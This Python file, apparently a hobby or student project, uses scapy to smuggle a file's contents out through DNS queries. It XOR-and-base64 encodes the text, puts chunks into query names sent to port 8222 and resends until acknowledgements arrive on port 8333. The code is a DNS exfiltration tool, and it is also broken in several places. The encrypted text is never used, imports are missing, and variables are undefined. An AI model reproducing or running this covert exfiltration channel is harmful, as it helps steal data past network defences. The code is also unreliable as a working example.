import base64
from scapy.all import *
import os
from time import sleep
def simple_encrypt(string,ip):
    """encrypts the string with ip and xor"""
    """encrypts a string until end of line"""
    blah=ip.split('.')
    i=0
    encoded=""
    base64xor=[]
    for n in string:
        base64xor.append(chr(ord(n) ^ int(blah[i])))
        i+=1
        if i ==3:
            i =0

    xor_result_string = ''.join(base64xor)
    base=base64.b64encode(xor_result_string.encode())
    return base

def simple_decrypt(string , ip):
    blah = ip.split('.')
    i=0 
    org_string = []
    b64decode =base64.b64decode(string).decode()
    print(b64decode)
    for x in b64decode:
        decode_char=(chr(ord(x)^int(blah[i])))
        print("hej ",ord(x),blah[i],decode_char)
        org_string.append(decode_char)
        i+=1
        if i ==3 :
            i=0
    decoded=''.join(org_string)
    print(decoded)

def send_dns(dns_ip, ip, msg):
    """send msg over dns on port 8222 and recive ack on 8333"""
    # Calculate the total number of packets to send problem is scapy could only send 180 packages
    how_many_msg = math.ceil(len(msg) / 180)
    sequence = 1
    header = {}  # Store each packet part by sequence number
    max_retries = 5
    partmsg = ""

    # Set up server socket for receiving acknowledgments
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((ip, 8333))
        server.listen()
      
    except Exception as e:
        print("Could not bind:", e)

    while msg or sequence <= how_many_msg:
        socket,addr = server.accept()
        # If there is more message to send than 180 characters
        if len(msg) > 180:
            partmsg = msg[:180]
            msg = msg[180:] 
        else:
            partmsg = msg
            msg = "" 

      
        header[sequence] = partmsg

        # Prepare the packet data
        headlen = str(len(str(sequence)) +len(str(how_many_msg)) + len(ip) + 1)
        encrypted_msg = simple_encrypt(partmsg, ip)
        encrypted_str = encrypted_msg.decode('utf-8')  # Ensure to decode from bytes to str if needed
        qname = f"{sequence}{how_many_msg}{headlen}{ip}{partmsg}"

        # Construct the packet layers
        ip_layer = IP(src=dns_ip)
        udp_layer = UDP(sport=RandShort(), dport=8222)
        dns_layer = DNS(rd=1, qd=DNSQR(qname=qname), ar=DNSRROPT())

        # Send the packet
        packet = ip_layer / udp_layer / dns_layer
        send(packet)
        sequence += 1

    # Receive acknowledgments and resend any missing packets
    while header:
        try:
            server.settimeout(3)  # Adjust timeout based on expected latency
            ack, client_addr = server.recv(1024)
            ack_sequence = int(ack.decode())

            if ack_sequence in header:
                header.pop(ack_sequence)  # Remove acknowledged packets
            

        except socket.timeout:
            print("Timeout, retrying missing packets...")
            for seq, data in list(header.items()):
                retries = 0
                ack, client_addr = server.recvfrom(1024)
                print("client",ack,client_addr)
                while retries < max_retries:
                    # Resend packet with sequence number
                    headlen = str(len(str(seq))+len(str(how_many_msg)) + len(ip) + 1)
                    qname = f"{seq}{how_many_msg}{headlen}{ip}{data}"
                    dns_layer = DNS(rd=1, qd=DNSQR(qname=qname), ar=DNSRROPT())
                    packet = ip_layer / udp_layer / dns_layer
                    send(packet)
                    retries += 1
                    time.sleep(1)
                    if seq not in header:
                        break  # Stop if acknowledged        
   

def send_encrypted_file(filename,ip,ip_dns,time):
    filecontent=""
    if os.file_exist(filename):
        with open(filename,"r") as file:
            filecontent= file.read()
    while True:
        if len(enc_file) >180:
            partmsg = enc_file[:180]
            enc_file= enc_file[180:]
        
        else:
            partmsg=enc_file
        send_dns(ip,ip_dns,partmsg)
        sleep(time)

